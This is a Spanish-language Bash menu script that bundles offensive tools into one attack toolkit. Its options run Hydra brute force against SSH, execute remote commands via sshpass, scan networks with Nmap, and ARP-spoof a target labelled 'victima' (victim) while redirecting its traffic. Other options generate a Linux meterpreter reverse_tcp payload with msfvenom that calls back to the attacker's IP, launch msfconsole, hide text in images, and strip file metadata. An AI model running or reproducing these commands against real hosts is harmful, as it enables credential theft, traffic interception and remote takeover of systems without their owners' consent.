#!/bin/bash

clear;

#opcion=0

while [ opcion!=0 ]
do
      clear;
      echo " ";
      echo " ----------------------------------------------------------";
      echo "|                  (っ◔◡◔)っ  Menu                         |";
      echo "|----------------------------------------------------------|";
      echo "|                         OPCIONES                         |";
      echo "|----------------------------------------------------------|";
      echo "| 20 - Salir                                               |";
      echo "| 16 - Borrar metadatos (no borra todos)                   |";
      echo "| 15 - Cambiar metadato de archivo                         |";
      echo "| 14 - Ver metadatos de un archivo                         |";
      echo "| 13 - Extraer texto de imagen                             |";
      echo "| 12 - Fusionar texto a imagen                             |";
      echo "| 11 - Mostrar contenido oculto de una imagen              |";
      echo "| 10 - Añadir contenido a una imagen                       |";
      echo "|  9 - Ejecutar Exploit                                    |";
      echo "|  8 - Crear Exploit                                       |";
      echo "|  7 - Sherlock                                            |";
      echo "|  6 - Restablecer red                                     |";
      echo "|  5 - Dejar sin red                                       |";
      echo "|  4 - Ver S.O de un equipo                                |";
      echo "|  3 - Nmap toda la red                                    |";
      echo "|  2 - SSH DirectAT                                        |";
      echo "|  1 - Hydra SSH                                           |";
      echo "|  0 - Instalar dependencias                               |";
      echo " ----------------------------------------------------------";
      read -p "Escoge opcion: " opcion;


      case $opcion in
	
	0)
	echo "actualizando librerias"
	sleep 2
	sudo apt update
	echo "instalando metasploit"
	sleep 2
	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
	chmod +x msfinstall && sudo ./msfinstall
	echo "instalando Hydra"
	sleep 2
	sudo apt install --yes hydra
	echo "instalando NMAP"
	sleep 2
	sudo apt install --yes nmap
	echo "instalando DSNIFF"
	sleep 2
	sudo apt install --yes dsniff
	echo "instalando SSH"
	sleep 2
	sudo apt install --yes ssh
	echo "instalando NFTABLES"
	sleep 2
	sudo apt install --yes nftables 
	echo "instalando EXIFTOOL"
	sleep 2
	sudo apt install --yes libimage-exiftool-perl
	echo "instalando Sherlock"
	sleep 2
	git clone https://github.com/sherlock-project/sherlock.git
	python3 -m pip install -r sherlock/requirements.txt
	;;
        1)
	clear
	read -p "Usuario: " usuario
	read -p "IP: " ip

	hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh
	;;

        2)
	clear
	read -p "Dime la contraseña: " contra
	read -p "Dime el usuario: " usu
	read -p "Dime la IP: " ip
	read -p "Que comando quieres usar: " comand

	watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "
	;;

 	3)
	clear
	read -p "Dime el nombre de la Red: " red
	read -p "Parametros? (T4,sP): " parametro

	nmap -$parametro $red/24
	sleep 60
	;;
	4)
	clear
	read -p "Dime el equipo que quieres comprobar: " eq

	nmap -T4 -O $eq
	;;

	5)
	#read -p "Dime la ip del gateway: " gateway
	read -p "Dime la ip de la victima: " victima

	arpspoof -t 192.168.12.10 $victima 2> /dev/null &
	arpspoof -t $victima 192.168.12.10 2> /dev/null &
	sysctl net.ipv4.ip_forward=1
	nft -f redir80443.txt
	;;
	
	6)
	killall arpspoof
	;;
	7)
	read -p "Dime el usuario que quieres investigar: " usr

	python3 /home/calipso/sherlock/sherlock/sherlock.py $usr
	sleep 60
	;;
	8)

	read -p "Dime como quieres que se llame el exploit: " exp
	read -p "Dime tu IP: " ip
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o ~/$exp
	;;

	9)
	msfconsole -q -r exploit.rc
	;;
	10)
	read -p "Dime el texto que quieres meter en una imagen: " texto
	read -p "Dime el nombre de la imagen: " nimagen
	echo $texto > .topsecret.txt && cat $nimagen .topsecret.txt > $nimagen
	;;
	11)
	read -p "Dime nombre de la imagen: " img
	strings $img	
	;;
	12)
	read -p "Dime el texto que quieres meter en una imagen: " texto
	read -p "Dime el nombre de la imagen: " nimagen
	
	echo $texto > .pato.txt 
	steghide embed -ef .pato.txt -cf $nimagen
	;;
	13)
	read -p "Dime nombre del archivo: " img
	steghide extract -sf $nimagen	
	;;
	14)
	read -p "Dime nombre del archivo: " img
	exiftool -s $img
	sleep 10
	;;
	15)
	read -p "Dime nombre del archivo: " arch
	read -p "Dime el nombre del metadato que quieres modificar: " meta
	read -p "Dime el nuevo valor que quieres añadirle: " valor
	exiftool -$meta=$valor $arch
	;;
	16)
	read -p "Dime el del archivo: " arch
	exiftool -all= $arch
	;;
	
	20)
		exit
	;;

esac
done

